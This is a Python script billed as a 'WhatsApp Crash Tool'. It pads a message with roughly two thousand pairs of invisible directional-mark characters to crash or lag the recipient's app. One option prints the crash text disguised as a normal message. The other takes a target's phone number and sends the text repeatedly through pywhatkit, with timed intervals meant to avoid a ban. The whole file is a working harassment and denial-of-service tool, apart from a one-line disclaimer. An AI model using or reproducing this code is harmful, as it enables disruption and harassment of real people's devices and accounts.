#This program crashes a whatsapp account without crash texts 
#it works by adding the 8026 amd 8027 ascii character to you message multiple times because these characters are invisible, they can bevome much and cause a ddos

from datetime import datetime
import sys
import time
from time import sleep

messagetosend = "Ahhhhhh"

intensitynum = 3
page = 1
error = False
errorintensity = False
while page == 1:
		
	print("\033[0;32;40m#########################")
	print("#")
	print("#")
	print("# Scream - Whatsapp Crash Tool")
	print("#")
	print("\033[1;32;40mBy Karma-cyberwarrrior \n")
	print("\033[0;32;40m#########################")
	print("Crash Tool || \nDo not use againt devices not permitted to use ||")
	print("karma-cyberwarrior.netlify.app")
	print(" ")
	if error  == True:
		print("[ × ] Please input a correct option")
		
	print("Choose an option")
	print("1. Automate the message(less effective/little lag)")
	print("2. Generate a crash message disguised as a normal message(Dangerous and to be only used with PC)")
	print("3. Exit")
	option = input("Choose a number: ")
	
	if option == "1":
		page = 4
	elif option == "2":
		page = 5
	elif option == "3":
		print("Good bye!")
		time.sleep(0.5)
		sys.exit()
	else:
		page = 1
		error = True

while page == 5:
	if errorintensity == True:
		print("Please input a right intensity number")
		print("")
	print("Enter the following details")
	message = input("Enter message to turn to crash text: ")
	intensity = int(input("Enter intensity number on 1-5: "))
	move = False 
	
	if intensity == 1:
		move = True
	elif intensity == 2:
		move = True
	elif intensity == 3:
		move = True
	else:
		errorintensity = True
		page = 5

	if message != "" and message != " ":
		messagetosend = message
		
	messageconv = [ ]
	
	
	for char in messagetosend:
		ascii = ord(char)
		seek = ascii
		messageconv.append(seek)
	
	count = 0
	
	while count <= 2000:
		bug = 8206
		bugt = 8207
		messageconv.append(bug)
		messageconv.append(bugt)
		count = count + 1
		
		
	wordbug = ""
	for num in messageconv:
		wordbug = wordbug + chr(num)
		
	final = wordbug
	
	print("Copy the text below")
	print(final)
	page = 3

while page == 4:
	print("Enter the following details")
	councode = input("Target's country code e.g (234, 91): ")
	number = input(f"Target's number: {councode} ")
	targetno = f"+{councode}{number}"
	message = input("Type a normal message: ")
	print("")
	print("\033[1;31;40mDue to browser url limit, the crash text would be shortened and sent multiple times.\nTo avoid ban, there'd be timer interval.")
	print("\033[0;32;40m")
	crashtimes = int(input("Amount of times to send the message: "))
	
	print("")
	print("loading")
	
	if message != "" and message != " ":
		messagetosend = message

	page = 2
		

		
		
while page == 2:
	messageconv = [ ]
	
	
	for char in messagetosend:
		ascii = ord(char)
		seek = ascii
		messageconv.append(seek)
	
	count = 0
	
	while count <= 2000:
		bug = 8206
		bugt = 8207
		messageconv.append(bug)
		messageconv.append(bugt)
		count = count + 1
		
		
	wordbug = ""
	for num in messageconv:
		wordbug = wordbug + chr(num)
		
	final = wordbug
	import pywhatkit
	

	for i in range (crashtimes):
		print("")
		print("Sending crasht text...")
		now = datetime.now()
		hour = now.hour
		mintoexec = now.minute + 1
		pywhatkit.sendwhatmsg(targetno, final, hour, mintoexec)
		time.sleep(60)
	
	page = 3
	
	
while page == 3:
	print("")
	print("Completed")
	sys.exit()
